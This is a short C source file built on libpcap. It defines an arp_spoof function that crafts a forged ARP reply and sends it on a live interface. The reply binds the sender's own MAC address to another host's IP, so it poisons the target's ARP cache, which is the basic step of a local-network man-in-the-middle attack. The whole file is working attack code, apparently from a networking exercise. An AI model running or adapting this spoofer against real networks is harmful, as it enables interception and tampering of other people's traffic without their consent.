#include "header.h"

static etherh etherh;
static arph arph;
static packet packet;
int arp_spoof(char *dev, u_char *my_mac, u_char *tar_mac,uint32_t SenIP, uint32_t TarIP){
    int res1=-1;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle2 = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if(res1==-1){
        arph.op = 0x0200;
        memcpy(&etherh.DMAC, &tar_mac[0], 6); //Destination MAC
        memcpy(&etherh.SMAC, &my_mac[0], 6); //Source MAC
        memcpy(&arph.SenMAC, &my_mac[0], 6); //Sender MAC
        memcpy(&arph.SenIP, &TarIP, sizeof(TarIP)); //Sender IP
        memcpy(&arph.TarMAC, &tar_mac[0], 6); //Target MAC
        memcpy(&arph.TarIP, &SenIP, sizeof(SenIP)); //Target IP
        packet.eth = etherh;
        packet.arp = arph;

        if (handle2 == nullptr) {
            fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
            return -1;
        }
        int res2 = pcap_sendpacket(handle2,(u_char*)&packet, 42);
        if(res2 == -1){
            printf("res2 = %d Send Fail \n",res2);
            return -1;
        }
        else if(res2==0){
            printf("res2 = %d Send Success \n",res2);
        }
    }
    pcap_close(handle2);
    return 1;
}
